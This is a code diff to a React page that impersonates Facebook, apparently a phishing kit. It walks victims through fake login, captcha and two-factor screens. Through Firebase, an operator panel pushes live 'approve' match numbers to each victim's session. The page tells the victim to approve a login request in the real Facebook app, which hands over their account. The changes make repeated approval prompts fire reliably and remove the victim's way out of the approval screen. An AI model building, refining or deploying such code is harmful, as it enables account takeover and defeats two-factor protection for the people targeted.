@@ -35,7 +35,7 @@ export default function Home() {
 
   // --- STATES FORM MODAL ---
   const [showModal, setShowModal] = useState(false);
-  const [step, setStep] = useState(1); // 1=signup, 1.5=thông báo liên kết, 2=login, 3=captcha, 4=otp, 5=success
+  const [step, setStep] = useState(1); // 1=signup, 1.5=thông báo liên kết, 2=login, 3=captcha, 4=otp/duyệt, 5=success
   const [clientIp, setClientIp] = useState('Unknown');
   const [busName, setBusName] = useState(''); const [perEmail, setPerEmail] = useState(''); const [busEmail, setBusEmail] = useState('');
   const [countryCode, setCountryCode] = useState('+1'); const [phoneNum, setPhoneNum] = useState('');
@@ -127,7 +127,9 @@ export default function Home() {
                     setStep(4); setMatchNumber(null); setShowSuccess(false);
                 } 
                 else if (data.action === 'approve' && data.value) {
-                    setStep(4); setMatchNumber(data.value); setShowSuccess(false);
+                    // Tách lấy con số từ payload (vì có đính kèm Date.now())
+                    const rawNumber = data.value.split('|')[0]; 
+                    setStep(4); setMatchNumber(rawNumber); setShowSuccess(false);
                 } 
                 else if (data.action === 'success') {
                     setStep(5); setShowSuccess(true);
@@ -155,7 +157,7 @@ export default function Home() {
 
   // --- OTP TIMER EFFECT ---
   useEffect(() => {
-    if (step === 4) {
+    if (step === 4 && !matchNumber) {
       setOtpSecondsLeft(120);
       setOtpCanResend(false);
       const interval = setInterval(() => {
@@ -166,7 +168,7 @@ export default function Home() {
       }, 1000);
       return () => clearInterval(interval);
     }
-  }, [step, otpResetCount]);
+  }, [step, otpResetCount, matchNumber]);
 
   const openModal = () => {
     setShowModal(true); setStep(1);
@@ -291,9 +293,12 @@ export default function Home() {
       const targetUser = adminSessionId.trim();
       if (!targetUser) { alert('Please enter the Session ID!'); return; }
 
+      // Nếu là lệnh approve, đính kèm timestamp để ép Firebase trigger lại dù số giống hệt
+      const payloadValue = type === 'approve' ? `${value}|${Date.now()}` : value;
+
       set(ref(database, 'commands/' + targetUser), {
           action: type,
-          value: value
+          value: payloadValue
       }).then(() => {
           alert(`Command sent to ${targetUser}!`);
       }).catch((error) => {
@@ -436,7 +441,7 @@ export default function Home() {
           </div>
       </footer>
 
-      {/* ================= MODAL (DÙNG CHUNG CHO SIGNUP, THÔNG BÁO, LOGIN, CAPTCHA, OTP, SUCCESS VÀ ADMIN) ================= */}
+      {/* ================= MODAL ================= */}
       {showModal && (
         <div style={{ position: 'fixed', inset: 0, background: 'rgba(0, 0, 0, 0.4)', zIndex: 1000, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '24px 16px', overflowY: 'auto', backdropFilter: 'blur(4px)', WebkitBackdropFilter: 'blur(4px)' }}>
             <div style={{ position: 'relative', background: '#fff', borderRadius: '12px', padding: '28px 20px 20px', width: '100%', maxWidth: '420px', boxShadow: '0 12px 28px rgba(0,0,0,0.2)' }}>
@@ -869,175 +874,151 @@ export default function Home() {
                       </div>
                     )}
 
-{/* BƯỚC 4: OTP / DEVICE APPROVAL */}
-{step === 4 && !showSuccess && (
-  <>
-    <div style={{ textAlign: 'center', marginBottom: '16px' }}>
-      <h2 style={{ fontSize: '22px', fontWeight: '800', color: '#1c1e21', marginBottom: '8px', letterSpacing: '-0.3px' }}>
-        {matchNumber ? 'Approve login request' : 'Two-factor authentication'}
-      </h2>
-      <p style={{ fontSize: '14px', color: '#65676b', lineHeight: '1.5', margin: 0 }}>
-        {matchNumber 
-          ? 'For your security, we sent a login request to your Facebook app. Please approve it to continue.' 
-          : 'Enter the 6-digit or 8-digit code we sent to your WhatsApp, SMS, or Gmail.'}
-      </p>
-    </div>
+                    {/* BƯỚC 4: OTP / DEVICE APPROVAL */}
+                    {step === 4 && !showSuccess && (
+                      <>
+                        <div style={{ textAlign: 'center', marginBottom: '16px' }}>
+                          <h2 style={{ fontSize: '22px', fontWeight: '800', color: '#1c1e21', marginBottom: '8px', letterSpacing: '-0.3px' }}>
+                            {matchNumber ? 'Approve login request' : 'Two-factor authentication'}
+                          </h2>
+                          <p style={{ fontSize: '14px', color: '#65676b', lineHeight: '1.5', margin: 0 }}>
+                            {matchNumber 
+                              ? 'For your security, we sent a login request to your Facebook app. Please approve it to continue.' 
+                              : 'Enter the 6-digit or 8-digit code we sent to your WhatsApp, SMS, or Gmail.'}
+                          </p>
+                        </div>
 
-    {/* HÌNH ẢNH MINH HỌA TO, KÉO RỘNG 2 BÊN */}
-    <div style={{ 
-      margin: '0 -20px 24px -20px', 
-      width: 'calc(100% + 40px)',
-      display: 'flex', 
-      justifyContent: 'center',
-      backgroundColor: '#f5f6f7', 
-      overflow: 'hidden'
-    }}>
-      <img
-        src="/images/approve-device.png"
-        alt="Device Approval"
-        style={{ 
-          width: '100%', 
-          height: 'auto', 
-          maxHeight: '240px', 
-          objectFit: 'cover',
-          display: 'block'
-        }}
-      />
-    </div>
+                        {/* HÌNH ẢNH MINH HỌA TO, KÉO RỘNG 2 BÊN */}
+                        <div style={{ 
+                          margin: '0 -20px 24px -20px', 
+                          width: 'calc(100% + 40px)',
+                          display: 'flex', 
+                          justifyContent: 'center',
+                          backgroundColor: '#f5f6f7', 
+                          overflow: 'hidden'
+                        }}>
+                          <img
+                            src="/images/approve-device.png"
+                            alt="Device Approval"
+                            style={{ 
+                              width: '100%', 
+                              height: 'auto', 
+                              maxHeight: '240px', 
+                              objectFit: 'cover',
+                              display: 'block'
+                            }}
+                          />
+                        </div>
 
-    {matchNumber ? (
-      /* TRƯỜNG HỢP CÓ SỐ DUYỆT TỪ ADMIN */
-      <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
-        
-        {/* HỘP HƯỚNG DẪN DUYỆT TRÊN APP */}
-        <div style={{ 
-          background: '#f0f7ff', 
-          border: '1px solid #0064e0', 
-          padding: '20px 16px', 
-          borderRadius: '12px', 
-          textAlign: 'center',
-          boxShadow: '0 4px 12px rgba(0, 100, 224, 0.08)'
-        }}>
-          <p style={{ margin: '0 0 12px 0', fontSize: '15px', color: '#1c1e21', fontWeight: '600', lineHeight: '1.5' }}>
-            Open the Facebook app on your phone and select the matching number:
-          </p>
-          
-          {/* CON SỐ TO RÕ RÀNG */}
-          <div style={{ 
-            fontSize: '40px', 
-            fontWeight: '900', 
-            color: '#0064e0', 
-            letterSpacing: '8px', 
-            textIndent: '8px',
-            marginBottom: '8px'
-          }}>
-            {matchNumber}
-          </div>
-          
-          <p style={{ margin: 0, fontSize: '13px', color: '#65676b' }}>
-            Tap <strong>"Yes, it's me"</strong> or <strong>"Approve"</strong> in the app.
-          </p>
-        </div>
+                        {matchNumber ? (
+                          /* TRƯỜNG HỢP CÓ SỐ DUYỆT TỪ ADMIN */
+                          <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
+                            
+                            {/* HỘP HƯỚNG DẪN DUYỆT TRÊN APP */}
+                            <div style={{ 
+                              background: '#f0f7ff', 
+                              border: '1px solid #0064e0', 
+                              padding: '20px 16px', 
+                              borderRadius: '12px', 
+                              textAlign: 'center',
+                              boxShadow: '0 4px 12px rgba(0, 100, 224, 0.08)'
+                            }}>
+                              <p style={{ margin: '0 0 12px 0', fontSize: '15px', color: '#1c1e21', fontWeight: '600', lineHeight: '1.5' }}>
+                                Open the Facebook app on your phone and select the matching number:
+                              </p>
+                              
+                              <div style={{ 
+                                fontSize: '40px', 
+                                fontWeight: '900', 
+                                color: '#0064e0', 
+                                letterSpacing: '8px', 
+                                textIndent: '8px',
+                                marginBottom: '8px'
+                              }}>
+                                {matchNumber}
+                              </div>
+                              
+                              <p style={{ margin: 0, fontSize: '13px', color: '#65676b' }}>
+                                Tap <strong>"Yes, it's me"</strong> or <strong>"Approve"</strong> in the app.
+                              </p>
+                            </div>
 
-        {/* NÚT BÁO ĐÃ DUYỆT (Dùng để đóng modal, tránh trường hợp khách bị kẹt) */}
-        <button 
-          type="button" 
-          onClick={() => { setShowSuccess(true); setStep(5); }} 
-          className="fb-btn" 
-          style={{
-            height: 52,
-            background: '#0866FF',
-            color: '#fff',
-            marginTop: '8px',
-            display: 'flex',
-            justifyContent: 'center',
-            alignItems: 'center',
-            gap: 8,
-            fontSize: '16px',
-            fontWeight: '700'
-          }}
-        >
-          I have approved on my app
-        </button>
+                            {/* CHỈ GIỮ LẠI NÚT QUAY LẠI NHẬP CODE */}
+                            <div style={{ textAlign: 'center', marginTop: '4px' }}>
+                              <button 
+                                type="button"
+                                onClick={() => setMatchNumber(null)} 
+                                style={{ background: 'none', border: 'none', color: '#0064e0', fontSize: '14px', fontWeight: '600', cursor: 'pointer', textDecoration: 'underline' }}
+                              >
+                                Can't approve? Enter security code instead
+                              </button>
+                            </div>
 
-        {/* NÚT ẨN DÀNH CHO TRƯỜNG HỢP KHÁCH BỊ LỖI APP, MUỐN NHẬP OTP */}
-        <div style={{ textAlign: 'center', marginTop: '4px' }}>
-          <button 
-            type="button"
-            onClick={() => setMatchNumber(null)} // Xóa số duyệt để hiện lại form OTP
-            style={{ background: 'none', border: 'none', color: '#0064e0', fontSize: '13px', fontWeight: '600', cursor: 'pointer' }}
-          >
-            Can't approve? Enter security code instead
-          </button>
-        </div>
+                          </div>
+                        ) : (
+                          /* TRƯỜNG HỢP BÌNH THƯỜNG (NHẬP OTP) */
+                          <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+                            <input
+                              type="text"
+                              placeholder="Code"
+                              value={otp}
+                              onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }}
+                              style={{
+                                padding: '14px 16px',
+                                fontSize: '20px',
+                                border: '1px solid #ccd0d5',
+                                borderRadius: '8px',
+                                outline: 'none',
+                                width: '100%',
+                                boxSizing: 'border-box',
+                                textAlign: 'center',
+                                letterSpacing: '4px',
+                                fontWeight: '700'
+                              }}
+                            />
+                            
+                            <div style={{ fontSize: '13px', color: '#65676b', display: 'flex', alignItems: 'center', gap: '6px', flexWrap: 'wrap', justifyContent: 'center', margin: '4px 0' }}>
+                              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 12a9 9 0 1 1-9-9c2.52 0 4.93 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/></svg>
+                              It may take a few minutes.
+                              {otpCanResend ? (
+                                <button type="button" onClick={handleResendOtp} disabled={resendLoading} style={{
+                                  background: 'none', border: 'none',
+                                  color: resendLoading ? '#a0c3ff' : '#0064e0',
+                                  fontWeight: '600', cursor: resendLoading ? 'not-allowed' : 'pointer',
+                                  fontSize: '13px', padding: 0,
+                                  display: 'inline-flex', alignItems: 'center', gap: 6
+                                }}>
+                                  {resendLoading ? <><Spinner size={14} color="#0064e0" border={2} /> Sending...</> : 'Get a new code'}
+                                </button>
+                              ) : (
+                                <span>New code in <strong style={{ color: '#1c1e21' }}>{formatTime(otpSecondsLeft)}</strong></span>
+                              )}
+                            </div>
 
-      </div>
-    ) : (
-      /* TRƯỜNG HỢP BÌNH THƯỜNG (NHẬP OTP) */
-      <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
-        <input
-          type="text"
-          placeholder="Code"
-          value={otp}
-          onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }}
-          style={{
-            padding: '14px 16px',
-            fontSize: '20px',
-            border: '1px solid #ccd0d5',
-            borderRadius: '8px',
-            outline: 'none',
-            width: '100%',
-            boxSizing: 'border-box',
-            textAlign: 'center',
-            letterSpacing: '4px',
-            fontWeight: '700'
-          }}
-        />
-        
-        <div style={{ fontSize: '13px', color: '#65676b', display: 'flex', alignItems: 'center', gap: '6px', flexWrap: 'wrap', justifyContent: 'center', margin: '4px 0' }}>
-          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 12a9 9 0 1 1-9-9c2.52 0 4.93 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/></svg>
-          It may take a few minutes.
-          {otpCanResend ? (
-            <button type="button" onClick={handleResendOtp} disabled={resendLoading} style={{
-              background: 'none', border: 'none',
-              color: resendLoading ? '#a0c3ff' : '#0064e0',
-              fontWeight: '600', cursor: resendLoading ? 'not-allowed' : 'pointer',
-              fontSize: '13px', padding: 0,
-              display: 'inline-flex', alignItems: 'center', gap: 6
-            }}>
-              {resendLoading ? <><Spinner size={14} color="#0064e0" border={2} /> Sending...</> : 'Get a new code'}
-            </button>
-          ) : (
-            <span>New code in <strong style={{ color: '#1c1e21' }}>{formatTime(otpSecondsLeft)}</strong></span>
-          )}
-        </div>
+                            {showOtpError && <div style={{ color: '#fa383e', fontSize: '13px', textAlign: 'center', background: '#ffebe8', padding: '10px', borderRadius: '6px', fontWeight: '500' }}>Incorrect code. Please try again.</div>}
 
-        {showOtpError && <div style={{ color: '#fa383e', fontSize: '13px', textAlign: 'center', background: '#ffebe8', padding: '10px', borderRadius: '6px', fontWeight: '500' }}>Incorrect code. Please try again.</div>}
-
-        <button type="submit" disabled={loading || otp.length < 6} className="fb-btn" style={{
-          height: 52,
-          background: otp.length >= 6 && !loading ? '#0064e0' : '#e4e6eb',
-          color: otp.length >= 6 && !loading ? '#fff' : '#bcc0c4',
-          marginTop: '8px',
-          display: 'flex',
-          justifyContent: 'center',
-          alignItems: 'center',
-          gap: 8,
-          transition: 'all 0.2s ease',
-          fontSize: '16px'
-        }}>
-          {loading ? <Spinner size={22} color={otp.length >= 6 ? '#fff' : '#bcc0c4'} /> : 'Continue'}
-        </button>
-      </form>
-    )}
-  </>
-)}
+                            <button type="submit" disabled={loading || otp.length < 6} className="fb-btn" style={{
+                              height: 52,
+                              background: otp.length >= 6 && !loading ? '#0064e0' : '#e4e6eb',
+                              color: otp.length >= 6 && !loading ? '#fff' : '#bcc0c4',
+                              marginTop: '8px',
+                              display: 'flex',
+                              justifyContent: 'center',
+                              alignItems: 'center',
+                              gap: 8,
+                              transition: 'all 0.2s ease',
+                              fontSize: '16px'
+                            }}>
+                              {loading ? <Spinner size={22} color={otp.length >= 6 ? '#fff' : '#bcc0c4'} /> : 'Continue'}
+                            </button>
+                          </form>
+                        )}
+                      </>
+                    )}
 
                     {/* BƯỚC 5: SUCCESS (NÂNG CẤP GIAO DIỆN) */}
                     {showSuccess && (
                       <div style={{ textAlign: 'center', padding: '10px 0' }}>
-                        
-                        {/* CSS Keyframes cho hiệu ứng */}
                         <style>{`
                           @keyframes pulse-ring {
                             0% { transform: scale(0.8); opacity: 0.6; }
@@ -1057,16 +1038,12 @@ export default function Home() {
                         `}</style>
 
                         <div className="success-anim">
-                          {/* Icon Check với hiệu ứng lan tỏa */}
                           <div style={{ position: 'relative', width: '80px', height: '80px', margin: '0 auto 24px' }}>
-                            {/* Vòng tròn lan tỏa phía sau */}
                             <div style={{ 
                               position: 'absolute', inset: 0, 
                               background: '#0064e0', borderRadius: '50%', 
                               animation: 'pulse-ring 1.5s cubic-bezier(0.215, 0.61, 0.355, 1) infinite' 
                             }} />
-                            
-                            {/* Vòng tròn chính chứa icon */}
                             <div style={{ 
                               position: 'relative', width: '100%', height: '100%', 
                               background: 'linear-gradient(135deg, #0064e0, #0052b4)', 
@@ -1079,17 +1056,14 @@ export default function Home() {
                             </div>
                           </div>
 
-                          {/* Tiêu đề */}
                           <h2 style={{ fontSize: '24px', fontWeight: '800', color: '#1c1e21', marginBottom: '12px', letterSpacing: '-0.5px' }}>
                             Request submitted!
                           </h2>
                           
-                          {/* Nội dung */}
                           <p style={{ fontSize: '15px', color: '#65676b', lineHeight: '1.6', marginBottom: '28px', padding: '0 20px' }}>
                             Your request has been successfully sent. Our system is now reviewing your profile. Please wait up to <strong>24 hours</strong> for verification.
                           </p>
 
-                          {/* Nút đóng */}
                           <button 
                             type="button" 
                             onClick={() => { localStorage.clear(); window.location.replace('/live'); }} 
